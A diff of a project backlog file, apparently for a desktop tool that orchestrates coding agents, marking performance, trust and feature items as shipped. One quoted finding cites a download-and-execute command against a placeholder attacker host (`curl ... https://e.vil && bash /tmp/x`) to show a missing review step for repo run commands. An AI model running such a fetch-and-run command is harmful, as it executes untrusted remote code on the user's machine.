@@ -18,14 +18,14 @@
 > Source: the 2026-10-04 backlog audit (`TASK_COMPLETED/2610.md`). User-facing and performance first.
 
 1. ~~Status bar usage (T200.8)~~: shipped #284 (`TASK_COMPLETED/2610.md`).
-2. **Performance pack 1**: T185.8 reattach replay; polls (T185.10: git status + `gh pr view`,
-   TanStack `focusManager` + `enabled: isVisible`, `FloatingBrowser` 5s); V8 compile cache
-   (`module.enableCompileCache()` in main and the sidecar, `COMPETITIVE_UPDATE_2026_10.md` P2).
-3. **Trust pack**: T200.1 folder pre-trust, T200.2 child env markers, T200.3 per-pane error
-   boundary, T183.2 AI features via the logged-in CLI.
+2. ~~Performance pack 1~~: shipped (`perf/pack-1`): T185.8 reattach, T185.10 PR cache + focus-paused
+   polls; the V8 compile cache was dropped (see `TASK_COMPLETED/2610.md`).
+3. ~~Trust pack~~: shipped (`fix/trust-pack`): T200.1 trust inherited by worktrees, T200.2, T200.3,
+   T183.2 for the commit message; left: T182.3 run-command review, T183.2 background opt-in.
 4. **Performance pack 2**: T185.19 main process off the hot path.
-5. **User features, one PR each**: T200.6 answer agent questions, T200.4 queue + steer, T200.5 undo
-   turn, ~~T142 PR loop phase 1 (T200.7)~~: shipped (`feat/pr-watch`, `TASK_COMPLETED/2610.md`).
+5. **User features, one PR each**: ~~T200.6 answer agent questions~~ (shipped, `feat/answer-prompts`),
+   T200.4 queue + steer, ~~T200.5 undo turn~~ (`feat/undo-turn`), ~~T142 PR loop phase 1 (T200.7)~~:
+   shipped (`feat/pr-watch`, `TASK_COMPLETED/2610.md`).
 6. **Daily bugs**: opencode dies across app quit (Verify live below), git pane renames / MM files /
    silent failures (Audit leftovers below), T193.9 title trackers on reattach, T138 split modes,
    T185.11 scheduler timeout, T193.2 execPath.
@@ -441,16 +441,14 @@ exchange-bus MVP only, no headless council executions. Absorbs:
 two waves. Evidence, P2 and P3 items: `docs/RESEARCH/COMPETITIVE_UPDATE_2026_10.md`.
 
 Quick ones first (S):
-1. Pre-trust the folder before spawning (orca).
+1. ~~Pre-trust the folder~~ shipped 2026-10-04 (a worktree / pipeline folder inherits the trust
+   the user gave its project, `agents/claude-trust.ts`). Left, the per-repo half:
    > Merged from T182.3 (`added: 2026-08-19`) on 2026-10-04: **repo-authored run commands have no
    > review step.** `inspectCommand` on `.exegol/actions.yaml` is a seatbelt, not a boundary: a
    > `Makefile` target or a `package.json` script reaches the PTY without it, and even in
    > actions.yaml `curl -o /tmp/x https://e.vil && bash /tmp/x` passes. The honest fix is one
    > "this repo defines N run commands, review them" confirmation covering every source,
    > remembered per repo (one per-repo trust step together with the folder pre-trust).
-2. Strip the launching session's markers (CLAUDECODE, CLAUDE_CODE_CHILD_SESSION...) from the
-   child env (klaudio).
-3. Per-pane error boundary (superset).
 11. Bundled orchestration skills on our MCP tools (paseo).
 13. Send diff comments to the agent (emdash).
 
@@ -462,7 +460,9 @@ Then (S-M / M):
    > restore | manual`, content hash, size, and restore-with-diff (`local-history-api.ts`). More
    > valuable for us because AGENTS edit the files: the oplog stores git trees per operation, so
    > there is no way to open one file and see its timeline after an agent touched it.
-6. Answer agent questions from the Dashboard / notification (PermissionRequest hook body,
+6. ~~Answer agent questions~~ shipped 2026-10-04 for numbered prompts read from the screen
+   (`feat/answer-prompts`); left: notification buttons, the hook body as a cross-check. Was:
+   Answer agent questions from the Dashboard / notification (PermissionRequest hook body,
    `ask_user` MCP tool). T133 (remote channel) depends on this.
    > Merged from T171 (`added: 2026-08-13`) on 2026-10-04: **signed authorization over the agent
    > bus.** When a step genuinely needs the user, the bus has no way to carry an authorization the
@@ -660,7 +660,11 @@ below, context occupancy, is still open.)
      changes only one table).
    - (P2) Real cost from CLI events (claude `total_cost_usd`, codex events), stored as unknown,
      never 0, when the CLI does not report it.
-2. **Four features are dark until the user pastes an API key**: `agents/scoring.ts`,
+2. **Partly shipped 2026-10-04**: the Sparkles commit message runs through the logged-in CLI
+   (`lib/claude-print.ts`, `claude -p` with no tools, MCP, settings or session). Left: an opt-in
+   Settings toggle for the background ones (scoring, evaluator, evidence), which would spend the
+   user's plan limits unseen, and a key liveness probe. Original finding: **Four features are
+   dark until the user pastes an API key**: `agents/scoring.ts`,
    `ipc/procedures/diff-ai.ts` (the Sparkles commit button), `pipeline/evaluator.ts`,
    `pipeline/evidence.ts` — all through `callAnthropicMessage` with `x-api-key`. monocode spawns the
    user's ALREADY-AUTHENTICATED `claude` headless and isolated
